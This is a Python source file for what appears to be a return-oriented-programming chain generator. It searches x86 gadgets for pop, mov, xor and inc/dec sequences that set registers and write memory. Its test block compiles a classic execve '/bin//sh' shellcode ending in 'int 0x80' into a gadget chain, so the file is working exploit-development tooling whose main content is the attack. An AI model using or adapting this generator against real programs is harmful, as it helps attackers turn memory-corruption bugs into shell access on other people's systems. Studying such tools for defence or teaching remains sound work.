import copy
from struct import pack
from ROPcompile import dataaddressToValue
from ROPcompile import generalToBytes
import re
from Systems import *
registers = ["eax", "ecx", "edx", "ebx", "esp", "ebp", "esi", "edi"]

def addRet(gadget):
    return gadget.rstrip().append(" ; ret")

def removeRet(gadget):
    if gadget[-5:] == "; ret":
        return gadget[:-5]
    return gadget

def createGoal(shellcode):
    goal = SysState()
    run(goal, shellcode)
    return goal

def getWriterRegisters(gadget):
    dest = gadget[15:18]
    source = gadget[21:24]
    return dest, source

def writeExecutionSearch(startstate, endstate, Gadgets):
    execution = []
    success = False

    #Find all writing gadgets
    writers = [x for x in Gadgets if (re.match("mov dword ptr \[[a-z]{3}\], [a-z]{3} ; ret", x) is not None)]
    print("writing gadgets:")
    print(writers)

    #Get Location to write to
    writeLocation = ".data"
    print("write location:")
    if len(startstate.datavalues) != 0:
        writeLocation += " + " + str(len(startstate.datavalues))
    print(writeLocation)

    #Get data to write
    writeData = endstate.datavalues[-4:]
    print(writeData)

    #Attempt to find executions which set registers for each write gadget
    for w in writers:
        locationreg, valuereg = getWriterRegisters(w)
        setGoal = copy.deepcopy(startstate)
        setToLoc(setGoal, locationreg, "@ " + writeLocation)
        setToLoc(setGoal, valuereg, writeData)
        print("Searching for write using: " + w)
        setexec = setExecutionSearch(startstate, setGoal, Gadgets)
        if len(setexec) > 0:
            success = True
            execution = setexec
            execution.append(w)
            print("Found write using " + w)
            break

    #Add execution which sets registers to desired endstate
    #TODO
    
    if success == False:
        return []
    return execution

def popcontrol(Gadgets):
    control = [""] * len(registers)
    search = "|".join(Gadgets)
    for i, r in enumerate(registers):
        s = re.search("(pop [a-z]{3} ; )*(pop "+r+" ; )(pop [a-z]{3} ; )*ret", search)
        if type(s) is not None:
            control[i] = s.group()
    return control

def movcontrol(Gadgets, popcontrolled):
    control = [[], [], [], [], [], [], [], []]
    for i, _ in enumerate(registers):
        for r in registers:
            if "mov " + registers[i] + ", " + r + " ; ret" in Gadgets:
                control[i].append(r)

    return control

def xorcontrol(Gadgets):
    control = [False] * len(registers)
    for i, r in enumerate(registers):
        if ("xor " + r + ", " + r + " ; ret" in Gadgets) and ("inc " + r + " ; ret" in Gadgets):
            print("xor control of " + r)
            control[i] = True
    return control

def setExecutionSearch(startstate, endstate, Gadgets):
    print()
    print("setExecutionSearch")
    print("SYSTEM STATE")
    print("-----------------------")
    startstate.printSystem()
    print("-----------------------")
    print("")
    print("GOAL STATE")
    print("-----------------------")
    endstate.printSystem()
    print("-----------------------")
    success = False
    execution = []

    registersToSet = [x != y for x, y in zip(startstate.allRegisters(), endstate.allRegisters())]
    for i, r in enumerate(registers):
        if getFromLoc(endstate, r) == None:
            registersToSet[i] = False

    while True:
        savedreg = registersToSet
        print(savedreg)
        popcontrolled = popcontrol(Gadgets)
        for i, r in enumerate(registers):
            if registersToSet[i] == True:
                pops = [x[-4:-1] for x in removeRet(popcontrolled[i]).split(";")]
                pops.reverse()
                values = []
                null = False
                for reg in pops:
                    values.append(getFromLoc(endstate, reg))
                    if values[-1] is None:
                        values[-1] = 0
                    if type(values[-1]) == bytes and b'\x00' in values[-1]:
                        null = True
                if null:
                    continue                
                for reg in pops:
                    execution.append(getFromLoc(endstate, reg))
                execution.append(popcontrolled[i])
                registersToSet[i] = False
                #break out of loop if no progress is made
        if savedreg == registersToSet:
            break

    xorcontrolled = xorcontrol(Gadgets)
    print(xorcontrolled)
    print(registersToSet)
    for i in range(len(registersToSet)):
        if registersToSet[i] == True and xorcontrolled[i] == True:
            execution.extend([("inc " + registers[i] + " ; ret")] * int.from_bytes(getFromLoc(endstate, registers[i]), byteorder="little"))
            execution.append("xor " + registers[i] + ", " + registers[i] + " ; ret")
            registersToSet[i] = False

    fromcontrolled = movcontrol(Gadgets, popcontrolled)
    while True:
        savedreg = registersToSet
        print(savedreg)
        #iterate through registers which need to be set to a string value
        for i, r in enumerate(registersToSet):
            if r and type(getFromLoc(endstate, registers[i])) is str:
                print(registers[i] + " can receive value from:")
                print(fromcontrolled[i])
                
                #look for exact value in register
                for f in fromcontrolled[i]:
                    if getFromLoc(startstate, f) == getFromLoc(endstate, registers[i]):
                        print("found value in " + f)
                        execution.append("mov " + registers[i] + ", " + f + " ; ret")                             
                        registersToSet[i] = False
                #break early if exact value found
                if registersToSet[i] == False:
                    continue

                #check if value already is an address
                if type(getFromLoc(startstate, registers[i])) is str:
                    #address currently stored
                    addressplus = dataaddressToValue(getFromLoc(startstate, registers[i]))
                    #address needed
                    goaladdress = dataaddressToValue(getFromLoc(endstate, registers[i]))

                    #check if decrement gadget available if needed
                    if addressplus > goaladdress:
                        if "dec " + registers[i] + " ; ret" in Gadgets:
                            #add required number of decrements to execution
                            execution.extend(["dec " + registers[i] + " ; ret"] * (addressplus - goaladdress))  
                            registersToSet[i] = False

                    #check if increment gadget available if needed
                    if addressplus < goaladdress:
                        if "inc " + registers[i] + " ; ret" in Gadgets:
                            #add required number of increments to execution
                            execution.extend(["inc " + registers[i] + " ; ret"] * (goaladdress - addressplus))
                            registersToSet[i] = False
                    
                    if registersToSet[i] == False:
                        continue


                #iterate through all registers that values can be taken from
                for f in fromcontrolled[i]:
                    print(f)
                    print(type(getFromLoc(startstate, f)) is not str)
                    #break if value in register is not an address
                    if type(getFromLoc(startstate, f)) is not str:
                        continue

                    #address currently stored in source register
                    addressplus = dataaddressToValue(getFromLoc(startstate, f))
                    print(addressplus)
                    #address needed in destination register
                    goaladdress = dataaddressToValue(getFromLoc(endstate, registers[i]))
                    print(goaladdress)

                    #check if decrement gadget available if needed
                    if addressplus > goaladdress:
                        if "dec " + registers[i] + " ; ret" in Gadgets:
                            #add required number of decrements to execution
                            execution.extend(["dec " + registers[i] + " ; ret"] * (addressplus - goaladdress))  
                            registersToSet[i] = False
                        elif "dec " + f + " ; ret" in Gadgets and "inc " + f + " ; ret" in Gadgets:
                            execution.extend(["inc " + f + " ; ret"] * (addressplus - goaladdress))
                            execution.append("mov " + registers[i] + ", " + f + " ; ret") 
                            execution.extend(["dec " + f + " ; ret"] * (addressplus - goaladdress))
                            registersToSet[i] = False
                            break

                    #check if increment gadget available if needed
                    if addressplus < goaladdress:
                        if "inc " + registers[i] + " ; ret" in Gadgets:
                            #add required number of increments to execution
                            execution.extend(["inc " + registers[i] + " ; ret"] * (goaladdress - addressplus))
                            registersToSet[i] = False
                        elif "dec " + f + " ; ret" in Gadgets and "inc " + f + " ; ret" in Gadgets:
                            execution.extend(["dec " + f + " ; ret"] * (goaladdress - addressplus))
                            execution.append("mov " + registers[i] + ", " + f + " ; ret") 
                            execution.extend(["inc " + f + " ; ret"] * (goaladdress - addressplus))
                            registersToSet[i] = False
                            break

                    #move value from source register if source is not destination
                    if f != registers[i]:
                        execution.append("mov " + registers[i] + ", " + f + " ; ret") 

                    if registersToSet[i] == False:
                        break
        
        print(registersToSet)
        #break out of loop if no progress is made
        if savedreg == registersToSet:
            break
            
    execution.reverse()
    if not any(registersToSet):
        print("found set execution")
        print(execution)
        success = True
    else:
        print("failed to find set execution")
        print("best attempt")
        print(execution)
        print(registersToSet)
        
    if success == False:
        return []
    return execution

def findExecution(startstate, endstate, Gadgets):
    startstate.printSystem()
    if startstate.datavalues != endstate.datavalues:
        return writeExecutionSearch(startstate, endstate, Gadgets)
    return setExecutionSearch(startstate, endstate, Gadgets)


#shellcode should be a list of assembly instructions as strings
#gadgets should be a list of gadgets that will be available as strings
def create(shellcode, gadgets):
    retgadgets = [x for x in gadgets if x[-3:] == "ret"]
    allowedgadgets = [x for x in retgadgets if x.count(';') < 3]

    #Generate Goal State
    Goal = createGoal(shellcode)
    Goal.printSystem()

    #Initialise Simulation
    GadgetSequence = []
    System = SysState()
    SubGoal = SysState()

    #Reverse Execution from goal
    execution = []

    #Load to .data
    while Goal.datavalues != System.datavalues:
        SubGoal = copy.deepcopy(System)
        SubGoal.datavalues = Goal.datavalues[:len(System.datavalues)+4]
        section = findExecution(System, SubGoal, allowedgadgets)
        if len(section) == 0:
            print("Failed to write to data")
            quit()
        else:
            print("Added data write")
        execution.extend(section)
        run(System, section)
        
    #Load register values
    regload = findExecution(System, Goal, allowedgadgets)
    execution.extend(regload)
    TestSystem = SysState()
    run(TestSystem, execution)
    TestSystem.printSystem()
    print(execution)
    execution.append("int 0x80")
    #Return Sequence of Gadgets
    return execution

if __name__ == "__main__":
    #gadgets = ["pop edx ; ret", "pop eax ; ret", "mov dword ptr [edx], eax ; ret", "xor eax, eax ; ret", "pop ebx ; ret", "pop ecx ; ret"]

    import ROPcompile
    dictionary = {}
    ROPcompile.LoadGadgetDictionary("rop.txt", dictionary)
    gadgets = dictionary.keys()

    print("CREATE TEST")
    create(["pop edx", "@ .data", "pop eax", b'/bin', "mov dword ptr [edx], eax", "pop edx", "@ .data + 4", "pop eax", b'//sh', "mov dword ptr [edx], eax", "pop edx", "@ .data + 8", "xor eax, eax", "mov dword ptr [edx], eax", "pop ebx", "@ .data", "pop ecx", "pop ebx", "@ .data + 8", "@ .data", "pop edx", "@ .data + 8", "xor eax, eax"] + ["inc eax"]*11, gadgets)
